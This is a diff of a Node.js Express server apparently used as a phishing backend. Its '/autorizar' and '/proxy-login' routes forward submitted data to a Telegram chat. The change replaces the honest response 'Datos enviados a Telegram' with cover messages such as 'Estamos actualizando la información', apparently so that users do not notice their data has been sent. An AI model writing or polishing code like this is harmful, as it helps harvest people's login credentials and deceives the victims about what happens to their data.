@@ -54,7 +54,7 @@ app.post("/autorizar", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    res.json({ status: "ok", mensaje });
+    res.json({ status: "Datos recibidos correctamente", mensaje });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
@@ -78,7 +78,7 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    res.json({ status: "ok", mensaje: "Datos enviados a Telegram" });
+    res.json({ status: "Ingresando", mensaje: "Estamos actualizando la información" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
